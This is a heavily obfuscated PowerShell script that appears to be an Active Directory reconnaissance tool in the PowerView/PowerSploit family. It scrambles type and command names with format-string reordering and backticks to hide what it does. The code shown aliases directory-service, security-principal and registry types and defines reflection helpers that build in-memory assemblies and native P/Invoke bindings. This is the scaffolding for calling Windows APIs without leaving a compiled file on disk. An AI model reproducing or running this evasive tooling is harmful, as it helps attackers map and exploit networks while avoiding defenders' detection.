 &("{1}{2}{0}" -f 'tEM','SE','t-I')  ('Va'+'RiA'+'blE:fW'+'hQ')  (  [tYPe]("{0}{1}"-F 'gu','iD') )  ;   ${X3`5LhT}  = [TyPe]("{1}{0}{10}{6}{3}{8}{2}{9}{5}{7}{4}" -f'UNTIme.inT','R','CAllI','sERvIcE','on','oNv','RoP','enTi','s.','ngc','e')  ; &("{2}{1}{0}"-f'Em','t','sET-I') ("{1}{3}{4}{2}{0}"-f 'W','v','6','arIABlE:rT','1')  (  [tyPE]("{9}{2}{3}{4}{5}{0}{6}{7}{8}{1}"-f 'PseRVI','t','unT','ImE.I','nt','erO','ces','.cHA','RsE','R')) ;  &("{1}{0}{2}" -f'T-IT','se','Em') ("{3}{2}{0}{1}" -f'le:5R','8u9J','B','VaRIA')  (  [tyPe]("{1}{8}{2}{7}{4}{11}{9}{0}{5}{6}{10}{3}" -F 'attr','RunTime.In','r','E','IC','i','Bu','V','TErOpSE','LiMPoRT','T','ES.Dl'))  ;    ${7s`lb2}=[tYPE]("{3}{4}{1}{2}{0}"-F 'uTe','SAtTRI','B','fl','Ag') ;  &("{0}{2}{1}"-f'sE','teM','T-I')  ('VaRia'+'BLE'+':AW1') ([tYpe]("{2}{0}{3}{7}{1}{6}{4}{8}{5}" -f'EFl','EmI','R','E','PaCK','gsIzE','T.','CtIon.','in'));  ${T`8rCv} = [typE]("{0}{2}{3}{1}{4}" -F're','EAttr','Fle','cTIOn.Typ','iBuTES')  ;   &("{1}{0}" -f 'M','seT-Ite') ('vaRI'+'abLe:'+'Svj') ( [tYpE]("{4}{8}{1}{0}{5}{3}{6}{2}{7}" -F 'ErO','nT','aLAs','seRVIceS.MArS','RuNT','p','H','attRibuTE','imE.i') )  ;   &("{0}{2}{1}"-f'SeT-i','eM','T')  ("va"+"riaBLe:"+"Xk"+"r") ( [TyPE]("{0}{1}"-f 't','YPE')  );  &('sV')  ('aMg'+'nV')  ([TYpE]("{0}{3}{6}{2}{4}{5}{1}{7}" -F 'R','o','CtIoN','EF','.em','IT.OPC','LE','dES'))  ;    &("{2}{1}{0}"-f 't-ItEm','E','s') ("{0}{2}{3}{1}"-f 'vARIa','2','bLe:J4','Ol')  ([tyPE]("{2}{1}{0}"-F'H','.PaT','iO'))  ; &("{0}{1}{2}" -f 'S','Et','-iteM')  ("{3}{1}{2}{0}" -f'nq9tA','Ab','lE:','vaRI')  ( [TypE]("{0}{2}{1}" -f'SYstEm.i','fILe','o.') )  ;&("{3}{2}{0}{1}" -f 'i','aBLe','-var','set')  ("{0}{1}"-f 'T0','Y')  (  [TYPe]("{4}{3}{2}{0}{1}" -f 'mo','DE','.fIlE','.io','sYSTEM') ) ; &('sV') ("z"+"xh")  (  [TYPE]("{0}{1}{3}{2}" -f 'SYSTEm.Io.Fi','LEAC','s','cES')  )  ;    &("{2}{0}{1}"-f 't-IT','em','SE')  ("{2}{0}{1}{3}"-f'ar','IaBLE:','V','p0e7x') (  [TyPE]("{1}{2}{0}" -f're','iO.FIlEsH','A'))  ;&("{0}{1}"-f 'SeT-ITE','M')  ("{1}{3}{4}{2}{0}"-f'G4','VARia',':fDiZ','Bl','e')  (  [tYPE]("{0}{1}" -f'nE','t.dnS'))  ;  ${3pf`GY}  = [TyPe]("{1}{2}{0}"-F'or','ACTiV','aT') ; &("{2}{0}{1}" -f 'e','t-iTEm','S')  ('v'+'ARiaBLE:'+'jf1') ([TYpE]("{1}{4}{5}{2}{6}{0}{3}" -f'rEA','sy','M.t','diNg.ThreaD','s','Te','H') ); &('sv') ("DS2"+"Bu") ([TyPe]("{2}{1}{0}{3}{4}"-F'TION.as','C','Refle','sE','Mbly') ) ;  ${lsj`Z`V6}  =[TYpE]("{1}{0}{4}{2}{3}" -f'ysTeM','S','r','ter','.bITcONve') ;  ${3Q9U`Tl} =[Type]("{5}{3}{4}{7}{2}{0}{6}{8}{1}"-F 'g','gS','iNdiN','em.Re','FLe','sYST','F','CtION.b','La');   ${J40Y} =[TYPE]("{7}{5}{11}{4}{3}{10}{0}{8}{9}{6}{2}{1}" -f'RALchA','n','TIo','s','rYsErviCe','EM.dIrEc','NgOP','SYST','s','i','.refeR','to'); &("{1}{0}{2}"-f'et-IT','s','em')  ("{2}{0}{4}{3}{1}"-f'arIaBL','8HU','V','j','e:59')  (  [TYpe]("{11}{10}{6}{5}{1}{0}{2}{4}{3}{9}{8}{7}" -f 'eR','rys','vIce','Rit','S.Secu','CtO','M.DIRE','ks','mAS','Y','e','SyST')  ) ;  &("{1}{0}" -f 'et','S') ("{1}{0}{2}" -f '3','7','bLJ9') (  [tyPe]("{0}{1}" -f 'arR','ay')  ) ; &('sv')  ("R6"+"EzPh") (  [type]("{3}{2}{0}{1}" -f'M.CONvE','Rt','STe','sy'))  ; &("{1}{0}"-f 't','se') ("{0}{1}" -f'J','at') ( [tYpE]("{5}{7}{4}{2}{8}{1}{0}{6}{3}"-F 'cTivEDiRECtORy.','S.a','rysERV','iN','O','sys','dOma','TeM.DirEcT','IcE'));  &("{0}{2}{1}"-f 'se','-Item','T')  ('vaR'+'Ia'+'bLe'+':shba5')  ([TYpe]("{1}{0}{2}"-F 'Onve','c','rt')  );    &("{0}{1}" -f'Se','t-ITEm') ("vAriaBL"+"e:0"+"Bz") (  [tYPe]("{0}{1}" -F'en','uM'));    &('sv')  ("3"+"57") ([TypE]("{2}{0}{1}" -f 'oNvERT','ER','BiTc') )  ; &("{0}{1}{2}"-f 'sET-','ItE','M') ("{0}{2}{3}{1}"-f'VaR',':OZDI','iABL','e') ( [TYpe]("{3}{4}{1}{2}{0}" -f 'g','TEXt.enC','odIn','s','YSTeM.'))  ; &("{1}{0}"-f 'teM','set-I') ("{0}{1}{2}"-f'vaRiabLE:2','5','F4') ( [typE]("{0}{3}{5}{4}{1}{2}{6}" -F 'SY','TR','InGS','ST','S','eM.','PlITOpTIoNS') ) ;   ${g`51}= [Type]("{1}{0}" -f 'X','RegE')  ;    &("{2}{0}{1}"-f 'I','tEM','set-')  ("{0}{1}{2}" -f'vAriaBle',':','JtS') (  [TYPE]("{5}{4}{0}{1}{2}{3}" -f'WIN3','2.','reg','istRykeY','Ft.','micROSO') ) ;    &("{2}{1}{0}" -f 'bLe','-VArIA','seT')  ('o5R'+'hLx')  (  [tyPe]("{1}{6}{2}{7}{0}{4}{5}{3}{9}{8}"-F 'pSeR','sYSTeM.RuNt','e.inteR','M','vICes','.','im','o','ShAl','aR') )  ;  ${9`RjY} = [tYpe]("{2}{0}{1}" -F 'IL','E','IO.f'); &('sv')  ("4CKI"+"p7") ( [TYpe]("{8}{10}{5}{3}{13}{7}{6}{14}{1}{0}{11}{4}{12}{9}{2}"-f'p','.runs','iOnSTaTE','.','.in','M','aUTOMaTi','ENt.','Sys','LSesS','Te','aCes','ITIa','Managem','on'))  ;   &("{0}{1}"-f's','ET-ItEM')  ("v"+"aRIablE:1"+"t"+"ZD")  (  [TypE]("{6}{1}{2}{7}{3}{4}{5}{0}"-F'E','Y','sTeM.ThrEAdInG.a','t','m','entSTAt','s','Par') );&("{1}{2}{0}"-f'm','SEt-','ITE') ("{0}{2}{1}" -f'Va','ablE:LTHSf','RI') ( [TyPe]("{2}{1}{0}{3}"-f'A','PaceF','rUnS','CtORy') )  ;&("{1}{0}" -f'ET','S')  ("9"+"cQ")  ( [tYpE]("{2}{1}{0}"-F 'WerShELl','o','P')  )  ;    ${d2`en}=  [TYpe]("{1}{0}{2}" -F'ro','enVi','NmEnt');&("{2}{0}{1}" -f'-itE','m','Set')  ("{0}{3}{1}{2}"-f'vAR','k','f1','IABLe:aUS') ([tYPe]("{2}{1}{0}"-f 's','.dn','sysTem.nET')  );    ${r4`F6} = [typE]("{2}{1}{0}"-F'TetIMe','a','D') ;&("{1}{0}" -f'eM','sEt-iT')  ("{3}{2}{0}{1}" -f 'IaB','lE:p4z7sd','AR','v') ([tyPE]("{2}{1}{0}"-F'tORY','C','IO.DIRE')  )  ;  &("{0}{1}"-f 'S','eT')  ("{1}{0}"-f 'sv','0H') (  [TYpe]("{4}{1}{7}{0}{2}{5}{6}{8}{3}"-F'.s','s','ecu','NoWNsiDType','sy','rI','Ty.prIN','TEm','CipaL.WEllk')  ) ;&('sv') ("f1"+"8T") ( [Type]("{3}{0}{5}{2}{4}{1}" -F 'NtI','SHAl','inTErOpseRVICe','Ru','s.maR','mE.')  ) ;    &("{1}{2}{0}" -f'TEm','SET','-i')  ("VaRI"+"aBLE:5r0"+"VK") ([tyPe]("{2}{5}{4}{0}{7}{3}{8}{1}{6}" -F 'u','D','MaN','mAt','.A','AgEmeNt','EnTIAl','TO','iOn.PScrE')  );   ${1`in} = [TYpE]("{7}{5}{8}{6}{0}{11}{2}{1}{10}{9}{4}{3}"-f 'cT','icES.AC','ySeRv','OrY.fOResT','RECT','yst','Re','s','Em.di','i','tiVeD','or');   &("{2}{1}{0}" -f'eM','t','sEt-i') ("vaRIa"+"Bl"+"E:Q"+"1Y")  ([tyPe]("{0}{1}" -F 'stR','INg')  ); &("{2}{1}{0}{3}"-f 'Ab','-vAri','SEt','le')  ("oy"+"9")  ( [Type]("{0}{1}" -F 'InTPT','r') ) ;  ${IP`L6`OU} =[tYPe]("{1}{0}"-F'nT32','i'); 












function NEw-i`NmeMO`R`Y`MODUlE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{7}{11}{8}{9}{4}{2}{5}{10}{6}" -f'se','PSU','anging','Should','tateCh','Functi','s','Proce','s','ForS','on','s'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(pOSiTion = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${MoD`ULeN`AmE} =   ( &("{3}{0}{1}{2}" -f'-v','AriaB','le','gET')  ("FWH"+"q") )."va`LuE"::("{1}{2}{0}"-f'd','NewG','ui').Invoke().("{0}{1}{2}"-f 'ToSt','ri','ng').Invoke()
    )

    ${a`P`pdoM`AIN} =   ( &("{0}{2}{1}"-f 'Va','AbLE','Ri')  ("dS2B"+"u")  )."V`AluE"."aSSE`m`BLY".("{1}{0}"-f 'Type','Get').Invoke(("{2}{1}{3}{0}{4}" -f'm','em','Syst','.AppDo','ain')).("{0}{2}{1}" -f 'Get','rty','Prope').Invoke(("{0}{2}{1}{3}" -f'C','t','urren','Domain')).("{1}{0}" -f'lue','GetVa').Invoke(${n`ULL}, @())
    ${LOA`dED`Ass`emBLiEs} = ${aPpDOM`A`In}.("{1}{2}{3}{0}"-f'emblies','G','e','tAss').Invoke()

    foreach (${asSem`BlY} in ${Loa`D`EDAsS`E`mbLI`ES}) {
        if (${A`s`SembLy}."FuL`lna`mE" -and (${a`s`seMBLY}."F`UL`lNamE".("{0}{1}" -f 'Spl','it').Invoke(',')[0] -eq ${MoDule`N`A`ME})) {
            return ${A`s`SEmbLy}
        }
    }

    ${dYn`AS`sEMb`LY} = &("{3}{1}{2}{0}" -f't','ew','-Objec','N') ("{1}{3}{0}{4}{2}{6}{5}" -f'tion.A','Ref','sembly','lec','s','ame','N')(${modULE`N`AMe})
    ${Do`mAIn} = ${apP`Do`mAiN}
    ${a`sSeMBlyBU`i`l`DER} = ${DomA`In}.("{4}{2}{1}{0}{3}"-f 'Dyn','ne','i','amicAssembly','Def').Invoke(${D`Yna`SSembly}, 'Run')
    ${mO`dUL`eBui`L`dEr} = ${ASS`emBLYbui`lD`ER}.("{0}{4}{2}{3}{1}" -f 'DefineD','e','namicM','odul','y').Invoke(${Mo`dU`le`NAME}, ${FaL`Se})

    return ${moD`ULEBUil`der}
}




function fu`Nc {
    Param (
        [Parameter(POSItIOn = 0, MaNDatoRy = ${TR`Ue})]
        [String]
        ${D`l`LnAMe},

        [Parameter(poSItIOn = 1, mandatorY = ${T`RuE})]
        [string]
        ${FUN`CtI`O`NNa`Me},

        [Parameter(positIoN = 2, manDatOry = ${TR`Ue})]
        [Type]
        ${rEt`URNT`yPE},

        [Parameter(PosITion = 3)]
        [Type[]]
        ${pa`RAME`Te`Rt`YpES},

        [Parameter(poSITiOn = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${nAt`iVE`CalLI`Ngcon`V`ENTIoN},

        [Parameter(POsiTIon = 5)]
        [Runtime.InteropServices.CharSet]
        ${cha`RSet},

        [String]
        ${e`N`TrypOINT},

        [Switch]
        ${S`ETLASte`RRor}
    )

    ${Pr`Op`Er`TiES} = @{
        ("{0}{1}"-f'Dll','Name') = ${dll`N`AMe}
        ("{1}{2}{0}{3}"-f'nN','Func','tio','ame') = ${FUN`C`TIonna`mE}
        ("{1}{2}{0}"-f'Type','Retu','rn') = ${RE`T`UrN`TYPe}
    }

    if (${P`A`RAm`eTerT`YpES}) { ${pRO`PEr`Ties}[("{0}{3}{1}{2}" -f'Pa','meterT','ypes','ra')] = ${paRA`mEte`R`Ty`pEs} }
    if (${nA`T`iVECaLL`i`NGCOnv`eNTioN}) { ${PRope`RTi`ES}[("{0}{3}{4}{1}{5}{2}" -f 'NativeC','ve','n','allingC','on','ntio')] = ${nATiveCallI`Ng`cO`N`Ve`NTi`ON} }
    if (${c`h`ARset}) { ${prO`pE`R`TIes}[("{2}{0}{1}"-f 'ars','et','Ch')] = ${c`Ha`RseT} }
    if (${SeTLAst`ERr`or}) { ${p`R`OPeRTIEs}[("{0}{3}{1}{2}" -f'SetLast','r','ror','E')] = ${SEt`LaS`TerrOr} }
    if (${e`NTrY`pOi`NT}) { ${prOP`E`RT`ieS}[("{1}{0}{2}"-f 'ntryP','E','oint')] = ${ent`RYPO`i`NT} }

    &("{2}{1}{0}"-f 't','Objec','New-') ("{1}{0}{2}"-f 'S','P','Object') -Property ${p`ROpE`R`TIES}
}


function Add-wi`N`32TYPe
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(MaNdaTorY=${Tr`Ue}, ValUEfrompIPelInebyPropErtYNamE=${T`Rue})]
        [String]
        ${d`LLnamE},

        [Parameter(MANDaToRy=${t`RUe}, ValuefROmPipeLINeBYPrOpErtyNamE=${T`Rue})]
        [String]
        ${fu`NcT`iONnAMe},

        [Parameter(vAlUefrOmPIpElInebYpropErtyNAMe=${t`RUe})]
        [String]
        ${entry`p`Oint},

        [Parameter(manDAtoRy=${T`RuE}, vaLUEFrompiPELInEbYPROpERTYname=${t`RUe})]
        [Type]
        ${R`ETurnT`yPE},

        [Parameter(VAlUeFrOMpIPelINeBYpRopERTynamE=${Tr`Ue})]
        [Type[]]
        ${P`Ar`A`mETeR`TYpeS},

        [Parameter(VAluEfrompIpELiNeBypRoPErtYNAmE=${T`Rue})]
        [Runtime.InteropServices.CallingConvention]
        ${NAT`Iv`ECaLLINGCOn`VeNti`On} =  ${X3`5`lht}::"s`Td`CaLl",

        [Parameter(VALuefRomPiPELIneByprOpertYNAmE=${t`RUe})]
        [Runtime.InteropServices.CharSet]
        ${ch`A`RseT} =   ( &("{1}{0}"-f'RIaBle','va')  ("{0}{1}" -f'r','T16w')  -VaLu )::"au`TO",

        [Parameter(vAlUEFrOMPipeliNeBypRoPeRTynAmE=${T`RUe})]
        [Switch]
        ${sE`TL`A`STerROr},

        [Parameter(ManDaTORy=${t`Rue})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${Mo`DulE},

        [ValidateNotNull()]
        [String]
        ${na`m`Espace} = ''
    )

    BEGIN
    {
        ${TY`PeH`ASh} = @{}
    }

    PROCESS
    {
        if (${MoD`UlE} -is [Reflection.Assembly])
        {
            if (${naM`Espa`Ce})
            {
                ${TyPe`h`ASh}[${dl`L`NamE}] = ${m`Odule}.("{1}{0}" -f'tType','Ge').Invoke("$Namespace.$DllName")
            }
            else
            {
                ${TyPEh`A`Sh}[${dl`lna`me}] = ${m`ODU`le}.("{1}{2}{0}"-f'pe','Ge','tTy').Invoke(${dLl`N`Ame})
            }
        }
        else
        {
            
            if (!${TY`Pe`h`AsH}.("{0}{1}{2}{3}" -f 'Cont','ainsK','e','y').Invoke(${dL`l`NamE}))
            {
                if (${na`M`EspACE})
                {
                    ${TY`pe`HASh}[${DL`ln`AME}] = ${modu`LE}.("{2}{1}{0}"-f'Type','e','Defin').Invoke("$Namespace.$DllName", ("{3}{4}{2}{0}{1}"-f 'F','ieldInit','Before','Publ','ic,'))
                }
                else
                {
                    ${TYpEh`A`Sh}[${D`Lln`AmE}] = ${M`o`dULE}.("{0}{2}{1}"-f'Def','e','ineTyp').Invoke(${dLL`NaME}, ("{5}{1}{0}{2}{3}{4}"-f 'b','u','lic,Befo','reFieldI','nit','P'))
                }
            }

            ${ME`T`HOd} = ${TYP`EHAsh}[${DL`lnA`me}].("{3}{1}{2}{0}" -f'od','et','h','DefineM').Invoke(
                ${f`U`NcTIONN`AME},
                ("{1}{4}{2}{5}{0}{3}{6}" -f'c,Pinvo','P','l','ke','ub','ic,Stati','Impl'),
                ${REtU`RN`TYpE},
                ${pARAM`ET`ErTypES})

            
            ${I} = 1
            foreach(${pARA`mE`TeR} in ${PAR`A`metERty`PEs})
            {
                if (${PaR`A`MeTEr}."iS`BYREf")
                {
                    [void] ${M`E`THOD}.("{2}{3}{0}{1}"-f 'met','er','Def','inePara').Invoke(${i}, 'Out', ${N`UlL})
                }

                ${i}++
            }

            ${D`L`LiMPorT} = [Runtime.InteropServices.DllImportAttribute]
            ${S`Et`las`T`ERrorfiEld} = ${D`llimPo`RT}.("{0}{1}"-f 'GetFiel','d').Invoke(("{1}{0}{2}"-f 't','Se','LastError'))
            ${CA`LLI`NgConvEN`TI`OnFi`E`ld} = ${DLL`imp`O`RT}.("{0}{1}{2}"-f 'GetF','i','eld').Invoke(("{1}{3}{2}{0}{4}"-f'on','Calli','C','ng','vention'))
            ${CHA`RSe`Tf`IE`ld} = ${dLli`M`pOrT}.("{1}{0}{2}" -f'etFiel','G','d').Invoke(("{1}{2}{0}" -f't','Char','Se'))
            ${e`NTRY`poinTFIE`LD} = ${DLl`IMpo`RT}.("{0}{1}" -f'G','etField').Invoke(("{1}{2}{0}"-f'int','Entry','Po'))
            if (${SetlaS`Te`R`R`oR}) { ${S`lEvAL`Ue} = ${tR`Ue} } else { ${SlEVal`UE} = ${fa`L`SE} }

            if (${ps`Bou`N`DpARaMEtErS}[("{2}{0}{1}" -f 'i','nt','EntryPo')]) { ${EXpo`R`TEDf`UncNa`ME} = ${E`N`Try`pOInt} } else { ${E`xPOR`T`edFunCn`Ame} = ${fuN`cTi`On`Name} }

            
            ${con`sTRUC`T`oR} =  ${5R8`U9j}."GEtcO`NSt`R`U`cTor"([String])
            ${d`lLIm`pOrTATtR`IbUte} = &("{1}{2}{0}" -f 'ect','New-O','bj') ("{0}{2}{7}{1}{6}{5}{9}{8}{4}{3}{10}"-f'Re','ion.','f','uteBuil','b','Cu','Emit.','lect','ttri','stomA','der')(${co`N`stRUc`TOR},
                ${D`l`LnAme}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${sETLa`steRRO`RF`iEld},
                                           ${C`All`IngCO`NVeNTiONfIelD},
                                           ${CHarSEtF`iE`ld},
                                           ${entrYp`oi`NTfIe`lD}),
                [Object[]] @(${S`LevAL`UE},
                             ([Runtime.InteropServices.CallingConvention] ${NATiVe`CaLl`ING`coN`VentioN}),
                             ([Runtime.InteropServices.CharSet] ${c`HArs`ET}),
                             ${EXpoR`TE`dfu`NCNAMe}))

            ${M`et`hoD}.("{2}{4}{5}{3}{0}{1}"-f 'trib','ute','S','ustomAt','e','tC').Invoke(${D`LL`ImporTat`TRI`BuTe})
        }
    }

    END
    {
        if (${MO`d`UlE} -is [Reflection.Assembly])
        {
            return ${TyPE`H`ASh}
        }

        ${ReTURn`T`ypes} = @{}

        foreach (${k`EY} in ${typ`E`Hash}."Ke`yS")
        {
            ${ty`pE} = ${ty`pEH`Ash}[${K`eY}].("{0}{2}{1}"-f'Crea','ype','teT').Invoke()

            ${r`EturNT`YPES}[${K`ey}] = ${TY`pE}
        }

        return ${RetuR`Nt`YpEs}
    }
}


function PSE`N`Um {


    [OutputType([Type])]
    Param (
        [Parameter(PoSItioN = 0, maNdatoRy=${tR`Ue})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${Mo`DULe},

        [Parameter(pOsiTIoN = 1, MANdaTORY=${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${FU`l`lNA`mE},

        [Parameter(POsiTION = 2, MaNDaToRY=${Tr`Ue})]
        [Type]
        ${t`YpE},

        [Parameter(POsiTIoN = 3, MaNDaToRY=${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${eNU`MeLeM`enTs},

        [Switch]
        ${BitF`I`ELd}
    )

    if (${mO`DUlE} -is [Reflection.Assembly])
    {
        return (${m`od`UlE}.("{0}{2}{1}" -f 'Ge','ype','tT').Invoke(${FulL`NaME}))
    }

    ${EnUmT`y`Pe} = ${T`YPe} -as [Type]

    ${EnU`MbUil`D`ER} = ${MOdU`lE}.("{2}{1}{0}{3}" -f'neEnu','i','Def','m').Invoke(${F`ULLN`AMe}, ("{2}{0}{1}"-f 'ub','lic','P'), ${en`U`m`TyPE})

    if (${B`ItF`IeLD})
    {
        ${f`LAgsCON`s`TrU`CtOR} =  ${7`SL`B2}."GetcOns`T`RUCT`or"(@())
        ${FLaGscUSTO`m`Att`RIbuTe} = &("{2}{1}{0}"-f'ct','e','New-Obj') ("{9}{3}{5}{1}{4}{7}{2}{8}{6}{0}" -f 'r','ion.Emit.Cu','omA','le','s','ct','ributeBuilde','t','tt','Ref')(${flaGsCO`N`sTR`UCTOR}, @())
        ${eN`U`mBUil`DER}.("{0}{2}{3}{4}{1}{5}"-f'SetCu','t','stomAtt','ri','bu','e').Invoke(${flAgS`C`UsT`omATTRiBu`Te})
    }

    foreach (${k`eY} in ${eNuM`e`LE`M`EnTS}."ke`Ys")
    {
        
        ${N`ULl} = ${E`NUMBui`LDer}."DeFineL`it`eraL"(${K`ey}, ${enUMEL`EMe`N`Ts}[${K`eY}] -as ${ENumTy`PE})
    }

    ${E`NUM`B`UIldEr}.("{0}{1}{2}{3}"-f 'Creat','e','Ty','pe').Invoke()
}




function FI`eLd {
    Param (
        [Parameter(PoSitION = 0, MAndatoRy=${t`RuE})]
        [UInt16]
        ${POs`I`Tion},

        [Parameter(posItion = 1, MAnDAToRy=${t`RuE})]
        [Type]
        ${T`YPe},

        [Parameter(PosItiON = 2)]
        [UInt16]
        ${Off`S`ET},

        [Object[]]
        ${maRsha`L`AS}
    )

    @{
        posiTioN = ${pO`s`itioN}
        ("{1}{0}"-f'ype','T') = ${t`ype} -as [Type]
        ("{2}{0}{1}"-f'ffs','et','O') = ${oFfs`et}
        ("{2}{0}{1}"-f'rsha','lAs','Ma') = ${mA`RSH`AlaS}
    }
}


function St`RuCt
{


    [OutputType([Type])]
    Param (
        [Parameter(POSitIoN = 1, MAnDAtoRy=${t`RUE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${mOd`U`le},

        [Parameter(POSitIoN = 2, mandatorY=${tr`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fUL`lnamE},

        [Parameter(pOsITioN = 3, MANDaTOry=${tR`UE})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${S`Tru`cTfIELDs},

        [Reflection.Emit.PackingSize]
        ${p`Ac`kiNG`SIze} =   ( &('Ls') ('VariA'+'ble'+':aW1')  )."vA`luE"::"UNsPeC`If`ieD",

        [Switch]
        ${e`xP`lICItlayoUt}
    )

    if (${mO`D`ULe} -is [Reflection.Assembly])
    {
        return (${mo`d`ULe}.("{0}{1}" -f 'GetTy','pe').Invoke(${FUlL`Na`ME}))
    }

    [Reflection.TypeAttributes] ${StRUC`Ta`T`TR`ibuteS} = ("{14}{0}{11}{6}{10}{3}{15}{1}{5}{7}{8}{12}{4}{9}{2}{16}{13}"-f 'siCl','       P','  Befo','l','      Sealed,
 ','u',' ','b','li','     ','   C','ass,
    ','c,
  ','dInit','An','ass,
 ','reFiel')

    if (${E`Xp`LI`CiTlayo`UT})
    {
        ${sTrUCtAttri`Bu`T`es} = ${Str`UCtA`TtRIbUT`eS} -bor   (  &("{0}{3}{2}{1}"-f 'get-','e','aRiaBl','V') ("{1}{0}" -f'8Rcv','t') )."VaL`UE"::"Ex`plIcI`TlA`YOUT"
    }
    else
    {
        ${s`TRUC`TaTtRiB`UTes} = ${STr`U`CT`ATTRibuT`ES} -bor   ${T8`Rcv}::"S`equeNTiallayo`Ut"
    }

    ${strUc`TB`U`I`ldeR} = ${mo`Du`Le}."d`eFI`NET`Ype"(${F`Ul`lnAME}, ${sTrU`Ct`A`TtriB`UteS}, [ValueType], ${pAcKing`s`izE})
    ${cO`NS`TRUc`T`ORiNFo} =  (  &("{2}{0}{1}"-f'LDItE','m','CHi')  ("V"+"ariaBlE"+":s"+"vj"))."vA`LuE".("{2}{1}{0}" -f'onstructors','etC','G').Invoke()[0]
    ${s`Iz`E`Const} = @(  ( &("{2}{0}{1}" -f'e','m','gEt-it') ('vari'+'abLE:'+'svJ')  )."Va`lUE".("{2}{1}{0}"-f'ld','ie','GetF').Invoke(("{2}{1}{0}" -f'eConst','iz','S')))

    ${fIeL`DS} = &("{0}{1}{2}"-f'New-','Objec','t') ("{1}{0}{3}{2}"-f'ash','H','le[]','tab')(${STR`U`CT`FIELdS}."COu`Nt")

    
    
    
    foreach (${fi`eLD} in ${STRUcTf`i`e`LDS}."k`eys")
    {
        ${InD`eX} = ${S`TR`Uc`Tf`IelDS}[${fI`elD}][("{1}{0}" -f 'ition','Pos')]
        ${FiE`LDS}[${i`NDex}] = @{("{2}{1}{0}" -f 'Name','d','Fiel') = ${f`iEld}; ("{2}{0}{1}"-f 'operti','es','Pr') = ${s`TR`UCTF`IeldS}[${F`Ie`ld}]}
    }

    foreach (${f`IELd} in ${f`IEL`dS})
    {
        ${FiE`L`DnAme} = ${f`IE`ld}[("{1}{2}{0}"-f 'e','Fie','ldNam')]
        ${f`IE`LdpRop} = ${FI`E`ld}[("{0}{2}{1}" -f 'Prop','s','ertie')]

        ${OFf`Set} = ${fielDp`R`Op}[("{1}{0}"-f 'set','Off')]
        ${Ty`PE} = ${fie`Ldp`ROP}[("{0}{1}" -f 'Ty','pe')]
        ${MaR`sHAL`As} = ${FiELdp`R`op}[("{0}{1}{2}" -f 'Ma','rs','halAs')]

        ${new`F`IElD} = ${stR`Uc`TbU`ILDeR}.("{0}{2}{1}"-f'Defin','Field','e').Invoke(${fIEL`d`NAmE}, ${t`YpE}, ("{1}{2}{0}" -f'ic','P','ubl'))

        if (${MaRs`hAl`As})
        {
            ${UN`MaN`AgEdTYPe} = ${MaRsH`Al`As}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${M`Ar`S`HalAS}[1])
            {
                ${sI`zE} = ${MaRSH`A`Las}[1]
                ${attriB`Bu`I`lder} = &("{1}{0}{3}{2}"-f'e','N','ect','w-Obj') ("{0}{2}{8}{6}{1}{4}{7}{3}{5}"-f'Reflect','ri','ion.Emit.','Bu','bu','ilder','tt','te','CustomA')(${CO`NSt`RucT`oriN`Fo},
                    ${UN`mA`Na`gEDTY`Pe}, ${si`Z`eCoNST}, @(${s`Ize}))
            }
            else
            {
                ${AT`T`RI`BbuIL`DEr} = &("{0}{3}{1}{2}"-f 'New','ec','t','-Obj') ("{2}{3}{5}{4}{1}{6}{0}" -f 'teBuilder','omA','R','e','t','flection.Emit.Cus','ttribu')(${co`N`StRUcT`ORINfo}, [Object[]] @(${UNMAnAg`Ed`TyPE}))
            }

            ${N`eWFI`ELd}.("{2}{4}{3}{1}{0}"-f'ute','b','Se','stomAttri','tCu').Invoke(${a`TTrIBbui`l`dER})
        }

        if (${Ex`pLi`ciTLAyoUt}) { ${Ne`W`FIELD}.("{2}{1}{0}" -f 'et','fs','SetOf').Invoke(${o`FF`SEt}) }
    }

    
    
    ${s`IZEmET`hod} = ${STRu`CT`B`UildeR}.("{3}{1}{2}{0}"-f 'hod','neMe','t','Defi').Invoke(("{0}{1}" -f'G','etSize'),
        ("{2}{1}{0}" -f'atic','St','Public, '),
        [Int],
        [Type[]] @())
    ${i`lgE`Ne`RaTOr} = ${s`i`zeME`THOd}.("{0}{2}{1}"-f'Ge','ILGenerator','t').Invoke()
    
    ${IL`ge`NER`ATOR}.("{0}{1}"-f'E','mit').Invoke( (  &("{1}{0}"-f 'M','itE') ("{2}{1}{0}{3}"-f 'AmgN','aRIaBle:','V','V') )."vAL`Ue"::"Ldto`K`eN", ${S`TRU`CtbUI`LdeR})
    ${IlgENE`RA`ToR}.("{0}{1}" -f 'Em','it').Invoke(  (  &("{0}{1}"-f 'gc','i')  ("{2}{0}{1}" -f 'E:AmgN','V','VArIAbL')  )."vAL`Ue"::"Ca`ll",
          (  &("{1}{2}{0}"-f 'e','GeT-vA','RiaBl') ('x'+'Kr')  )."va`lUE".("{0}{2}{1}" -f 'Ge','od','tMeth').Invoke(("{2}{3}{0}{1}" -f 'nd','le','GetTypeFromH','a')))
    ${ILGEN`er`At`OR}.("{1}{0}" -f't','Emi').Invoke(  (&("{1}{0}"-f 'iable','Var') ("Amg"+"nV")  )."val`Ue"::"cA`lL",
         ${F`18t}.("{0}{1}{2}"-f'G','etM','ethod').Invoke(("{0}{1}{2}" -f'Si','z','eOf'), [Type[]] @([Type])))
    ${IlGeNErA`T`Or}.("{0}{1}"-f'E','mit').Invoke( (&("{1}{2}{0}{3}" -f'R','gEt','-Va','iABle')  ("{0}{1}" -f'AmG','NV') -ValueOnly  )::"R`ET")

    
    
